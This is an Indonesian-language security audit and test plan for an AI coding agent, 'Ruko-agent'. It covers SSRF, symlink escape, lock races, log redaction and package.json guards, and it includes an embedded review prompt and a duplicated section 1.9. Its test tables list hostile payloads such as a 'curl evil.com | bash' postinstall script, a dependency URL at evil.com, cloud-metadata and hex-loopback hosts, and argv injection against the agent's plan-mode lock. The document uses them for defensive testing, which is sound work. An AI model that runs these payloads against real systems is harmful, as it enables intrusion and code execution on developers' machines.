DOKUMEN QUALITY ASSURANCE & HARDENING AUDIT (QA.md)
Ruko-agent v2.0.0: Edge-Cases, Adversarial Test Harness & Hardening Checklist
Dokumen ini mencatat seluruh temuan audit keamanan mikro, skenario corner-case sistem operasi, dan rancangan pengujian adversarial yang wajib diuji sebelum setiap modul di-merge ke branch 2.0.0-unreleased. Berkas ini menjadi acuan tunggal untuk penulisan berkas pengujian unit (test/*.test.ts).
1. Inventarisasi Temuan Audit & Solusi Rekayasa
1.1 Modul Network: src/core/network/hostFetch.ts
 * Vektor Celah: Bypass Literal IPv6 dalam Kurung Siku ([::1])
   * Mekanisme: Parser WHATWG URL mempertahankan kurung siku pada URL seperti [http://[::1]:8080/](http://[::1]:8080/). Fungsi net.isIP("[::1]") mengembalikan nilai 0 (tidak valid), sehingga lolos dari evaluasi IP privat.
   * Solusi: Lakukan normalisasi hostname dengan mengupas karakter kurung siku sebelum validasi IP:
     const rawHostname = url.hostname.replace(/^\[|\]$/g, '');

 * Vektor Celah: Kebocoran Koneksi Soket (Socket Reuse / Keep-Alive)
   * Mekanisme: Connection pool bawaan http/https dapat menggunakan kembali soket TCP lama saat redirect, melewati callback lookup IP pinning.
   * Solusi: Matikan pool secara eksplisit menggunakan opsi agent: false dan sematkan header Connection: 'close'.
 * Vektor Celah: DNS Rebinding Time-of-Check to Time-of-Use (TOCTOU)
   * Mekanisme: Interval waktu mikro antara dns.lookup() awal dengan koneksi soket aktual.
   * Solusi: Callback lookup kustom langsung menyuplai pinnedIP hasil verifikasi pertama ke tingkat soket, mencegah lookup sekunder di level kernel.
1.2 Modul Sanitasi: src/core/prompt/sanitizer.ts
 * Vektor Celah: Mangling Nama Berkas Berkarakter Unicode Sah
   * Mekanisme: Penerapan ALLOWED_ASCII_RE secara agresif pada path berkas mengubah karakter alfabet sah beraksen (misal résumé.md diubah menjadi r\u00e9sum\u00e9.md), merusak representasi antarmuka dan pembacaan berkas.
   * Solusi: Pemisahan domain tanggung jawab fungsi secara tegas:
     * sanitizeForPrompt(input: string): Digunakan eksklusif untuk konten teks tak tepercaya yang disuntikkan ke prompt LLM (menerapkan NFKC, BiDi stripping, dan escape kontrol).
     * sanitizePath(userPath: string): Validasi sistem berkas yang berfokus memblokir path traversal (..), null bytes (\0), dan reserved names Win32 tanpa merusak karakter alfabet multibyte UTF-8 sah.
1.3 Modul Konkurensi & Mutex: src/core/state/fileLock.ts
 * Vektor Celah: Penghentian Detak Jantung Senyap (Silent Heartbeat Stoppage)
   * Mekanisme: Pemanggilan fs.utimes() di background timer yang gagal akibat disk penuh atau permission drop akan memutus heartbeat loop tanpa logging peringatan.
   * Solusi: Tambahkan pencatatan peringatan stderr dan implementasikan toleransi kegagalan berturut-turut (maksimal 3 kali retry) sebelum merilis atau mematikan lock.
 * Vektor Celah: Pergeseran Waktu Sistem (Clock Skew) pada Stale Detection
   * Mekanisme: Penyesuaian waktu NTP drastis dapat menyebabkan selisih Date.now() - stat.mtimeMs bernilai negatif atau melampaui batas stale secara prematur.
   * Solusi: Gunakan perhitungan selisih berbasis nilai absolut dan berikan batas toleransi (grace period) minimum.
1.4 Modul Isolasi Subproses: src/core/executor/resourceGovernor.ts
 * Vektor Celah: Restriksi PATH Merusak Version Manager Developer (DX Broken)
   * Mekanisme: Mengunci PATH statis hanya ke /usr/local/bin:/usr/bin:/bin menyebabkan biner toolchain lokal (node, tsc, cargo, pnpm) yang terpasang melalui nvm, fnm, asdf, atau volta tidak dapat ditemukan.
   * Solusi: Lakukan resolusi path biner kompilator absolut sebelum masuk ke spawnIsolated, atau bangun allowlist direktori toolchain pengguna yang terverifikasi (misalnya memfilter entri process.env.PATH yang berada di direktori pengguna terpercaya):
     function sanitizePathEnv(rawPath: string): string {
  const allowedDirs = rawPath.split(path.delimiter).filter(dir => {
    return !dir.includes('..') && (dir.startsWith('/usr') || dir.includes('.nvm') || dir.includes('.cargo') || dir.includes('nodejs'));
  });
  return allowedDirs.join(path.delimiter);
}

 * Vektor Celah: Buffer Accumulation Memory Spike
   * Mekanisme: Akumulasi output proses anak via penggabungan string Buffer dapat memakan memori berlebih sebelum batas 10MB tercapai.
   * Solusi: Lacak penghitung byte (byteCounter) secara streaming pada event data. Jika penghitung melebihi batas, langsung panggil killProcessTree dan hentikan pembacaan stream seketika.
1.5 Modul Guard Manifest: src/core/verification/packageJsonGuard.ts
 * Vektor Celah: Catastrophic Backtracking (ReDoS) pada Regex SemVer
   * Mekanisme: Penggunaan ekspresi reguler SemVer yang panjang pada string versi yang dirancang khusus dapat memicu ReDoS pada V8.
   * Solusi: Batasi panjang string versi maksimum 64 karakter sebelum evaluasi regex dijalankan.
 * Vektor Celah: Subpath Imports Hijacking
   * Mekanisme: Penyerang menyuntikkan entri berbahaya pada field imports di package.json untuk memetakan alias modul internal ke berkas sistem di luar root.
   * Solusi: Blokir penambahan atau modifikasi field imports yang mengarah ke luar root workspace atau menggunakan protokol eksternal.
1.6 Modul Redaksi Log: src/core/logging/redactionStream.ts
 * Vektor Celah: Secret Bocor di Batas Chunk Buffer (512-Byte Boundary Splitting)
   * Mekanisme: Memotong string sebelum menjalankan fungsi redactText menyebabkan token rahasia yang terbelah di batas potongan (misal ghp_ di potongan awal dan sisa token di potongan akhir) lolos dari deteksi regex.
   * Solusi: Potong buffer hanya pada batas baris baru (\n) terakhir sebelum safe margin 512 byte. Jika tidak ada newline, lakukan redaksi pada seluruh buffer terlebih dahulu sebelum memotong sisa tail.
1.7 Modul Otorisasi Scope: src/core/approval/scopeAmendment.ts
 * Vektor Celah: Proses Menggantung di Lingkungan Headless / CI Tanpa TTY
   * Mekanisme: Pemanggilan rl.question di runner CI/CD non-interaktif membuat proses tertahan tanpa batas waktu (hanging process).
   * Solusi: Validasi process.stdin.isTTY. Jika berada di lingkungan non-TTY atau non-interaktif, otomatis gagalkan (fail-closed). Tambahkan timer batas waktu 30 detik untuk sesi lokal interaktif.
1.8 Modul Pembacaan Berkas: src/core/tools/secureRead.ts
 * Batasan Platform: Ketiadaan O_NOFOLLOW pada Windows
   * Karakteristik: Windows Win32 tidak mendukung flag kernel O_NOFOLLOW.
   * Mitigasi: Jalankan iterasi pemeriksaan segmen per-path secara ketat (fs.lstat pada setiap subfolder) sebelum membuka berkas, dan lakukan verifikasi silang fs.realpath pasca-buka.
2. Matriks Uji & Skenario Adversarial (Test Harness)
| ID Uji | Modul Target | Payload / Kondisi Uji | Perilaku yang Diharapkan |
|---|---|---|---|
| TC-NET-01 | hostFetch.ts | [http://[::1]:8080/api](http://[::1]:8080/api) (IPv6 Literal) | Ditolak seketika dengan SSRFError (PRIVATE_IP_BLOCKED). |
| TC-NET-02 | hostFetch.ts | Redirect 302 dari [http://safe.com](http://safe.com) ke [http://169.254.169.254](http://169.254.169.254) | Hop 1 lolos, Hop 2 melempar SSRFError sebelum request terkirim. |
| TC-NET-03 | hostFetch.ts | Host DNS dengan 2 record (IP Publik + IP Privat 10.0.0.1) | Ditolak karena salah satu record terdeteksi privat. |
| TC-SEC-01 | secureRead.ts | Symlink di root repo mengarah ke /etc/passwd | Melempar error SYMLINK_ESCAPE atau SYMLINK_BLOCKED. |
| TC-SEC-02 | secureRead.ts | Target path mengandung null byte safe.txt\0.js | Melempar error NULL_BYTE. |
| TC-SEC-03 | secureRead.ts | Path dengan nama file beraksen docs/panduan_résumé.md | Berkas terbaca utuh tanpa error karakter. |
| TC-LCK-01 | fileLock.ts | Dua proses mencoba mengambil lock path yang sama secara simultan | Proses A memperoleh lock, Proses B menunggu antrean hingga timeout/rilis. |
| TC-LCK-02 | fileLock.ts | Direktori .lock sengaja diatur dengan mtime 15 detik lalu (stale) | Lock lama dievakuasi paksa; proses baru berhasil membuat lock. |
| TC-PKG-01 | packageJsonGuard.ts | Menyuntikkan dependensi "express": "[http://evil.com/pkg.tgz](http://evil.com/pkg.tgz)" | Ditolak dengan alasan injeksi URL eksternal. |
| TC-PKG-02 | packageJsonGuard.ts | Mengubah skrip postinstall: "curl evil.com | bash" | Ditolak karena manipulasi skrip siklus hidup. |
| TC-PKG-03 | packageJsonGuard.ts | Nilai versi SemVer sepanjang >100 karakter acak | Ditolak oleh limit karakter sebelum regex dieksekusi. |
| TC-RED-01 | redactionStream.ts | Token ghp_... terbelah persis di akhir chunk byte 512 | Token disensor penuh menjadi [REDACTED:GITHUB_TOKEN]. |
| TC-GOV-01 | resourceGovernor.ts | Eksekusi subprocess yang memakan waktu 35 detik (timeout default 30s) | Proses anak beserta process tree dibunuh secara tuntas (SIGKILL). |
| TC-GOV-02 | resourceGovernor.ts | Subprocess mencoba membaca process.env.NODE_OPTIONS | Variabel terbaca undefined (telah dibersihkan di sandbox). |
| TC-SCM-01 | scopeAmendment.ts | Perubahan di dalam subfolder yang disetujui (Subtree Auto-Approve) | Mutasi langsung diizinkan tanpa memunculkan prompt interaktif. |
| TC-SCM-02 | scopeAmendment.ts | Mutasi di luar subtree pada lingkungan non-TTY (CI=true) | Amandemen otomatis ditolak tanpa menggantung sesi. |
3. Checklist Verifikasi Pre-Merge (Definition of Quality)
Sebelum Pull Request digabungkan ke cabang utama:
 * [ ] Zero-Dependency Check: package.json tidak memiliki entri dependencies runtime (hanya devDependencies untuk testing).
 * [ ] Platform Parity: Rangkaian uji adversarial lolos 100% pada platform Linux (Ubuntu), macOS, dan Windows.
 * [ ] No Unhandled Rejections: Seluruh operasi I/O dan jaringan memiliki blok finally untuk merilis file handle, timer detak jantung, atau stream listener.
 * [ ] Fail-Closed Verification: Saat terjadi kegagalan parser (JSON rusak, timeout, error filesystem), sistem selalu memilih opsi penolakan izin paling restriktif (deny-by-default).
 * [ ] Audit Trail Integrity: Setiap penolakan akses atau amandemen izin tercatat ke dalam append-only hash chain log dengan format JSON kanonis.
### 1.9 Audit Red-Teaming Lanjutan (Syscall, Resolver & Windows Edge-Cases)

* **Vektor Celah: Semantic Gap `net.isIP()` vs OS Resolver (`0.0.0.0/8`, `::/128`, Non-Standard IPv4)**
  * *Mekanisme:* 
    1. Input URL dengan host `0.0.0.0` lolos evaluasi jika daftar CIDR hanya memuat rentang RFC 1918 dan loopback `127.0.0.0/8`. Kernel Linux/macOS merutekan koneksi `0.0.0.0` langsung ke `127.0.0.1`, memungkinkan akses tidak sah ke daemon lokal (misal Docker di port 2375).
    2. Format literal non-standar (hex `0x7f.0.0.1`, octal, atau integer decimal) menghasilkan nilai `0` pada `net.isIP()`, tetapi tetap diterjemahkan sebagai alamat IP loopback oleh `getaddrinfo` via implementasi legacy `inet_aton()`.
  * *Solusi:*
    * Tambahkan `0.0.0.0/8` dan `::/128` ke dalam blok CIDR terlarang pada `hostFetch.ts`.
    * Validasi CIDR wajib dieksekusi **hanya pada IP kanonis hasil resolusi DNS (`pinnedIP`)**, bukan pada string URL masukan mentah.
    * Pastikan callback socket connection melempar `SSRFError` jika `pinnedIP` tidak valid atau tergolong rentang terlarang.

* **Vektor Celah: Subtree Monotonic Expansion Bypass via Pre-Existing Symlink**
  * *Mekanisme:* Evaluasi `target.startsWith(approvedPath)` hanya memvalidasi kesamaan string path visual. Jika direktori yang disetujui memuat symlink yang mengarah ke luar root workspace sebelum sesi dimulai (misal `project/link -> /etc`), penulisan berkas `project/link/passwd` akan dianggap *auto-approved* secara visual padahal mutasi fisik terjadi di direktori sensitif host.
  * *Solusi:* 
    * Lakukan resolusi jalur fisik (`fs.realpathSync`) pada direktori induk (*parent directory*) target sebelum membandingkannya dengan direktori izin kanonis:
      ```typescript
      const parentDir = path.dirname(targetPath);
      const canonicalParent = fs.realpathSync(parentDir);
      const canonicalApproved = fs.realpathSync(approvedPath);

      if (!canonicalParent.startsWith(canonicalApproved + path.sep) && canonicalParent !== canonicalApproved) {
        // Blokir mutasi atau minta konfirmasi interaktif [Y/n]
      }
      ```

* **Vektor Celah: Eksekusi Kode Arbitrer via `tsc.cmd` Windows & Argv Injection pada Compiler Gate**
  * *Mekanisme:* 
    1. Di platform Windows, mengeksekusi `./node_modules/.bin/tsc` memicu eksekusi berkas batch `tsc.cmd`. Repositori pihak ketiga yang beritikad jahat dapat menyisipkan `tsc.cmd` palsu untuk memicu eksekusi kode tak terkontrol saat Ruko memanggil validasi Tier 0 di Plan Mode.
    2. Opsi baris perintah (`argv`) yang dipengaruhi oleh LLM dapat menyuntikkan flag seperti `--outDir`, memungkinkan proses kompilasi menulis berkas di luar ruang lingkup yang diizinkan saat masih dalam Plan Mode.
  * *Solusi:*
    * **Bypass Biner `.bin/`:** Eksekusi skrip JavaScript compiler secara langsung menggunakan biner Node.js terverifikasi (`process.execPath`):
      ```typescript
      const tscJsPath = path.join(workspace, 'node_modules/typescript/bin/tsc');
      spawn(process.execPath, [tscJsPath, '--noEmit'], {
        shell: false,
        env: isolatedEnv
      });
      ```
    * **Argv Locking:** Kunci daftar argumen kompilasi secara absolut (`['--noEmit']`) tanpa menerima parameter tambahan dari inferensi model.

---

### Tambahan Matriks Uji Adversarial (Test Harness)

| ID Uji | Modul Target | Payload / Kondisi Uji | Perilaku yang Diharapkan |
| :--- | :--- | :--- | :--- |
| **TC-NET-04** | `hostFetch.ts` | Request ke `http://0.0.0.0:3000` atau `http://[::]/` | Ditolak seketika dengan `SSRFError` (`PRIVATE_IP_BLOCKED`). |
| **TC-NET-05** | `hostFetch.ts` | Hostname berupa format hex/decimal (`http://0x7f.0.0.1` / `http://2130706433`) | Resolver menerjemahkan ke `127.0.0.1` dan IP pinning menolak koneksi via `SSRFError`. |
| **TC-SCM-03** | `scopeAmendment.ts` | Target mutasi berada di balik symlink direktori internal yang mengarah ke `/tmp` atau root sistem | Pengecekan realpath parent mendeteksi pelarian hierarki; operasi ditolak atau memicu prompt amandemen. |
| **TC-GOV-03** | `resourceGovernor.ts` / Tier 0 | Pemanggilan Compiler Gate pada repositori yang memuat `tsc.cmd` kustom di Windows | Sistem mengabaikan `.bin/tsc.cmd` dan mengeksekusi `node_modules/typescript/bin/tsc` via `process.execPath`. |
| **TC-GOV-04** | `resourceGovernor.ts` / Tier 0 | Parameter compiler disuntikkan flag `--outDir /evil/path` | Eksekutor menolak argumen asing dan hanya mengizinkan flag baku `--noEmit`. |

Kamu adalah Senior Distributed Systems & Concurrency Engineer.
Analisis arsitektur Dual-Plane State Machine dan Plan Mode Lock pada Ruko-agent v2.0.0 berikut.

Fokuskan penalaranmu pada:
1. Concurrency & Deadlocks: Apakah ada celah di mana FileLock (fs.mkdir + mtime heartbeat) gagal mencegah race condition saat dua sesi CLI berjalan paralel di direktori yang sama?
2. State Desynchronization: Apakah ada urutan eksekusi (misal crash mendadak, disk full, atau sinyal SIGINT/SIGTERM) yang menyebabkan state di ~/.ruko/sessions/ tidak sinkron dengan runtime agent, sehingga Plan Mode lock terbuka sebelum waktunya?
3. Logika Transisi: Evaluasi apakah aturan Subtree Monotonic Expansion memiliki kelemahan logika traversal hierarki direktori.

Gali setiap skenario secara kritis dan uji hipotesismu berulang kali sebelum menarik kesimpulan.

1. Model Ancaman & Invarian Arsitektur
 * Batas Tanggung Jawab (Threat Model): Menangani workstation single-user lokal yang berhadapan dengan repositori pihak ketiga tak tepercaya, prompt injection pada file sumber, manipulasi symlink, dan serangan SSRF ke jaringan internal developer.
 * Dual-Plane State Machine: State otoritatif runtime (mode, approvalScope, activePlanHash) diisolasi sepenuhnya di tingkat host pada ~/.ruko/sessions/ dengan izin berkas ketat 0600/0700. Berkas konfigurasi di dalam direktori workspace murni berstatus proyeksi baca (read-only projection).
 * Fail-Safe Resume: Setiap pemulihan sesi lama (session resume) otomatis mereset mode operasi kembali ke plan mode.
 * Plan Mode Mutation Lock (Deny-by-Default): Selama dalam mode plan, seluruh pemanggilan perintah shell dan mutasi sistem berkas diblokir 100% tanpa pengecualian.
 * Subtree Monotonic Expansion: Persetujuan akses mutasi (approval scope) menggunakan hierarki subtree. Modifikasi di dalam subdirektori yang sudah disetujui otomatis berstatus auto-approved, sedangkan mutasi di luar hierarki memicu verifikasi interaktif satu ketukan [Y/n].
2. Primitif Pertahanan Inti (Zero-Dependency)
 * HostFetch (node:http, node:https, node:net): Mitigasi SSRF dan DNS Rebinding dengan resolusi DNS manual per-hop, validasi CIDR privat komprehensif (IPv4, IPv6, dan IPv4-mapped IPv6), IP pinning langsung pada tingkat soket, preservasi TLS SNI, pemblokiran socket-reuse (agent: false, Connection: close), serta penolakan kredensial URL.
 * SecureRead (node:fs): Pembacaan file anti-TOCTOU (Time-of-Check to Time-of-Use) dan anti-symlink traversal via validasi segmen bertahap (fs.lstat), pembukaan berkas deskriptor atomik kernel (O_NOFOLLOW | O_CLOEXEC), serta verifikasi silang pasangan inode/device sebelum dan sesudah pembacaan.
 * Atomic FileLock (node:fs): Mutex konkurensi native berbasis primitif atomik fs.mkdir yang dilengkapi pembaruan detak jantung (mtime heartbeat), toleransi clock skew, serta eviksi otomatis terhadap stale lock dari proses yang mati mendadak (crash/SIGKILL).
 * Sanitizer (node:buffer): Pemisahan domain sanitasi:
   * Sanitasi Teks LLM: Normalisasi Unicode NFKC, pembersihan karakter BiDi override dan zero-width, serta penanganan code point multibyte non-BMP (pasangan surrogate) guna mencegah injeksi visual prompt.
   * Sanitasi Path: Menjaga keabsahan nama file beraksen/Unicode (misal résumé.md) sembari memblokir null byte dan traversal escape.
 * PackageJsonGuard: Validasi integritas manifest ketergantungan yang menolak penambahan atau perubahan skrip lifecycle berbahaya (preinstall, postinstall, prepare), pemblokiran skema URL eksternal atau git pada versi paket, proteksi polusi prototipe, mitigasi ReDoS SemVer, serta pencegahan pembajakan subpath imports.
 * ResourceGovernor (node:child_process): Eksekusi subproses terisolasi menggunakan shell: false, pembersihan variabel lingkungan yang berbahaya (NODE_OPTIONS, LD_PRELOAD, dll.), penegakan batas waktu (timeout), pemantauan kuota output stream, serta penghentian pohon proses secara tuntas (kill process tree).
3. Penegakan Kebijakan & Audit Integritas
 * Direct Compiler Gate (Tier 0 Verification): Agen memverifikasi keberhasilan perbaikan kode secara mandiri dengan mengeksekusi biner kompilator langsung (seperti ./node_modules/.bin/tsc --noEmit) tanpa melalui perantara skrip package.json yang dapat disusupi.
 * RedactionStream: Filter aliran teks berkinerja tinggi yang memotong buffer pada batas baris baru (\n) untuk menyensor kebocoran kunci privat, token akses personal (GitHub, AWS, Bearer), dan kredensial sensitif secara streaming.
 * Tamper-Evident Hash Chain Log: Setiap mutasi state, keputusan penolakan otorisasi, dan log eksekusi dicatat ke dalam berkas append-only terenkripsi rantai hash SHA-256 (prevHash), menjamin jejak audit tidak dapat dimanipulasi dari dalam workspace.

### 1.9 Audit Red-Teaming Lanjutan (Syscall, Resolver & Windows Edge-Cases)

* **Vektor Celah: Semantic Gap `net.isIP()` vs OS Resolver (`0.0.0.0/8`, `::/128`, Non-Standard IPv4)**
  * *Mekanisme:* 
    1. Input URL dengan host `0.0.0.0` lolos evaluasi jika daftar CIDR hanya memuat rentang RFC 1918 dan loopback `127.0.0.0/8`. Kernel Linux/macOS merutekan koneksi `0.0.0.0` langsung ke `127.0.0.1`, memungkinkan akses tidak sah ke daemon lokal (misal Docker di port 2375).
    2. Format literal non-standar (hex `0x7f.0.0.1`, octal, atau integer decimal) menghasilkan nilai `0` pada `net.isIP()`, tetapi tetap diterjemahkan sebagai alamat IP loopback oleh `getaddrinfo` via implementasi legacy `inet_aton()`.
  * *Solusi:*
    * Tambahkan `0.0.0.0/8` dan `::/128` ke dalam blok CIDR terlarang pada `hostFetch.ts`.
    * Validasi CIDR wajib dieksekusi **hanya pada IP kanonis hasil resolusi DNS (`pinnedIP`)**, bukan pada string URL masukan mentah.
    * Pastikan callback socket connection melempar `SSRFError` jika `pinnedIP` tidak valid atau tergolong rentang terlarang.

* **Vektor Celah: Subtree Monotonic Expansion Bypass via Pre-Existing Symlink**
  * *Mekanisme:* Evaluasi `target.startsWith(approvedPath)` hanya memvalidasi kesamaan string path visual. Jika direktori yang disetujui memuat symlink yang mengarah ke luar root workspace sebelum sesi dimulai (misal `project/link -> /etc`), penulisan berkas `project/link/passwd` akan dianggap *auto-approved* secara visual padahal mutasi fisik terjadi di direktori sensitif host.
  * *Solusi:* 
    * Lakukan resolusi jalur fisik (`fs.realpathSync`) pada direktori induk (*parent directory*) target sebelum membandingkannya dengan direktori izin kanonis:
      ```typescript
      const parentDir = path.dirname(targetPath);
      const canonicalParent = fs.realpathSync(parentDir);
      const canonicalApproved = fs.realpathSync(approvedPath);

      if (!canonicalParent.startsWith(canonicalApproved + path.sep) && canonicalParent !== canonicalApproved) {
        // Blokir mutasi atau minta konfirmasi interaktif [Y/n]
      }
      ```

* **Vektor Celah: Eksekusi Kode Arbitrer via `tsc.cmd` Windows & Argv Injection pada Compiler Gate**
  * *Mekanisme:* 
    1. Di platform Windows, mengeksekusi `./node_modules/.bin/tsc` memicu eksekusi berkas batch `tsc.cmd`. Repositori pihak ketiga yang beritikad jahat dapat menyisipkan `tsc.cmd` palsu untuk memicu eksekusi kode tak terkontrol saat Ruko memanggil validasi Tier 0 di Plan Mode.
    2. Opsi baris perintah (`argv`) yang dipengaruhi oleh LLM dapat menyuntikkan flag seperti `--outDir`, memungkinkan proses kompilasi menulis berkas di luar ruang lingkup yang diizinkan saat masih dalam Plan Mode.
  * *Solusi:*
    * **Bypass Biner `.bin/`:** Eksekusi skrip JavaScript compiler secara langsung menggunakan biner Node.js terverifikasi (`process.execPath`):
      ```typescript
      const tscJsPath = path.join(workspace, 'node_modules/typescript/bin/tsc');
      spawn(process.execPath, [tscJsPath, '--noEmit'], {
        shell: false,
        env: isolatedEnv
      });
      ```
    * **Argv Locking:** Kunci daftar argumen kompilasi secara absolut (`['--noEmit']`) tanpa menerima parameter tambahan dari inferensi model.

---

### Tambahan Matriks Uji Adversarial (Test Harness)

| ID Uji | Modul Target | Payload / Kondisi Uji | Perilaku yang Diharapkan |
| :--- | :--- | :--- | :--- |
| **TC-NET-04** | `hostFetch.ts` | Request ke `http://0.0.0.0:3000` atau `http://[::]/` | Ditolak seketika dengan `SSRFError` (`PRIVATE_IP_BLOCKED`). |
| **TC-NET-05** | `hostFetch.ts` | Hostname berupa format hex/decimal (`http://0x7f.0.0.1` / `http://2130706433`) | Resolver menerjemahkan ke `127.0.0.1` dan IP pinning menolak koneksi via `SSRFError`. |
| **TC-SCM-03** | `scopeAmendment.ts` | Target mutasi berada di balik symlink direktori internal yang mengarah ke `/tmp` atau root sistem | Pengecekan realpath parent mendeteksi pelarian hierarki; operasi ditolak atau memicu prompt amandemen. |
| **TC-GOV-03** | `resourceGovernor.ts` / Tier 0 | Pemanggilan Compiler Gate pada repositori yang memuat `tsc.cmd` kustom di Windows | Sistem mengabaikan `.bin/tsc.cmd` dan mengeksekusi `node_modules/typescript/bin/tsc` via `process.execPath`. |
| **TC-GOV-04** | `resourceGovernor.ts` / Tier 0 | Parameter compiler disuntikkan flag `--outDir /evil/path` | Eksekutor menolak argumen asing dan hanya mengizinkan flag baku `--noEmit`. |
### 1.10 Audit Konkurensi Sistem Terdistribusi & Ketahanan Filesystem (DeepSeek Review)

* **Vektor Celah: Stale Eviction Race & Split-Brain pada FileLock**
  * *Mekanisme:* 
    1. Penggunaan mekanisme eviksi otomatis (*auto-eviction*) berbasis `mtime` rentan terhadap *TOCTOU Check-Then-Act*. Jika dua sesi CLI waiter (B dan C) mendeteksi lock yang ditinggalkan oleh sesi crash (A) secara bersamaan, keduanya dapat mengeksekusi `fs.rm` dan `fs.mkdir` paralel. Hal ini memicu kondisi *split-brain* di mana kedua sesi sama-sama menganggap dirinya pemegang lock yang sah.
    2. *Event-loop starvation* di Node.js (misalnya saat sanitasi file teks berukuran besar atau kompilasi TypeScript intensif) dapat menunda `setInterval` pembaruan detak jantung (*heartbeat*), menyebabkan sesi yang sah keliru dianggap *stale* dan dieviksi secara prematur.
  * *Solusi:*
    * Ganti primitif pembuatan direktori dengan pembukaan berkas eksklusif atomik murni `fs.openSync(lockPath, 'wx', 0o600)` (`O_CREAT | O_EXCL`) yang menulis metadata `{ pid, nonce: crypto.randomUUID(), createdAt: Date.now() }`.
    * Terapkan kebijakan **Fail-Closed (Tanpa Auto-Eviction Latar Belakang)**: Jika lockfile terdeteksi dan PID pemilik sudah mati atau tidak merespons, agen menolak berjalan secara otomatis dan mewajibkan intervensi manual via parameter `--force-unlock`.

* **Vektor Celah: State Desynchronization via Truncated Write & Ketiadaan Directory Fsync**
  * *Mekanisme:* 
    1. Terminasi paksa (`SIGKILL`), crash daya, atau kondisi kehabisan ruang disk (`ENOSPC`) di tengah pembaruan `state.json` dapat meninggalkan berkas dalam kondisi terpotong (*truncated*). Jika deserialisasi JSON gagal dan penangan kesalahan (*fallback handler*) mereset state ke status *bypass*, invarian *Plan Mode Lock* terbuka secara tidak sah.
    2. Operasi `fs.rename` di sistem berkas POSIX (ext4/APFS) hanya memutasi entri memori *cache*. Tanpa sinkronisasi ke direktori induk, kegagalan sistem dapat mengembalikan nama berkas ke versi lama sementara mutasi fisik di workspace sudah terjadi, merusak rantai audit *activePlanHash*.
  * *Solusi:*
    * Pola penulisan atomik 3-tahap wajib:
      1. Tulis payload ke berkas sementara: `sessionPath.<uuid>.tmp` dengan izin `0600`.
      2. Panggil `fs.fsyncSync(fileFd)` sebelum menutup deskriptor berkas.
      3. Eksekusi `fs.renameSync(tmpPath, sessionPath)`.
      4. Buka deskriptor direktori induk (`path.dirname(sessionPath)`) dan panggil `fs.fsyncSync(dirFd)` pada platform POSIX non-Win32.
    * **Fail-Closed State Resume:** Jika berkas state korup, terpotong, atau gagal lolos verifikasi hash rantai, sistem wajib **HALT / CRASH SECARA EKSPLISIT** dan menolak mengeksekusi tindakan apa pun hingga sesi dipulihkan manual.

* **Vektor Celah: Prefix Collision & Privilege Creep pada Subtree Monotonic Expansion**
  * *Mekanisme:*
    1. Validasi berbasis string `target.startsWith(approvedPath)` meloloskan direktori tetangga (*sibling collision*), misalnya target `/workspace/src-evil/` akan dianggap diizinkan jika ruang lingkup yang disetujui adalah `/workspace/src`.
    2. Sifat ekspansi yang murni monotonik (*monotonic-only*) berisiko memicu *privilege creep*: jika pengembang tidak sengaja mengonfirmasi izin pada direktori tingkat tinggi (seperti `/` atau `/tmp`), seluruh sisa sesi terkontaminasi izin berlebih tanpa opsi pembatalan.
  * *Solusi:*
    * Validasi segmen jalur kanonis wajib menyertakan pemisah direktori:
      ```typescript
      const isAllowed = canonicalParent === canonicalApproved || 
                        canonicalParent.startsWith(canonicalApproved + path.sep);
      ```
    * Sediakan perintah interaktif pemulihan batas (*Scope Contraction / Reset*) di terminal atau TUI untuk mengembalikan daftar `approvalScope` ke konfigurasi awal tanpa harus membatalkan seluruh sesi.

---

### Tambahan Matriks Uji Adversarial Konkurensi & Status (Test Harness)

| ID Uji | Modul Target | Payload / Kondisi Uji | Perilaku yang Diharapkan |
| :--- | :--- | :--- | :--- |
| **TC-LCK-01** | `fileLock.ts` | Dua proses worker mencoba *acquire* lock secara simultan pada berkas yang sama via flag `wx` | Tepat satu proses yang berhasil (`fd > 0`); proses kedua langsung menerima error `EEXIST`. |
| **TC-LCK-02** | `fileLock.ts` | Berkas lockfile eksis dengan PID proses yang sudah mati (stale lock) | Agen berhenti dengan pesan kesalahan eksplisit; menolak auto-evict tanpa flag `--force-unlock`. |
| **TC-STA-01** | `hostState.ts` | Berkas `state.json` sengaja dipotong di tengah data (`{"mode": "act", "ap...`) | Pemulihan sesi gagal (*Fail-Closed*); proses melempar `CorruptedStateError` dan menghentikan eksekusi. |
| **TC-STA-02** | `hostState.ts` | Mutasi state pada lingkungan POSIX | Eksekusi `fsync` diverifikasi terpanggil pada deskriptor berkas sementara dan deskriptor direktori induk. |
| **TC-SCM-04** | `scopeAmendment.ts` | Target mutasi berupa direktori sibling prefix-collision: `/repo/src-patch/a.ts` dengan scope `/repo/src` | Validasi menolak eksekusi mutasi langsung; memicu prompt interaktif amandemen scope. |
| **TC-SCM-05** | `scopeAmendment.ts` | Pemanggilan utilitas reset/kontraksi scope saat berada di dalam amandemen `/repo/` | Nilai `approvalScope` kembali terkunci ke konfigurasi direktori awal repositori. |
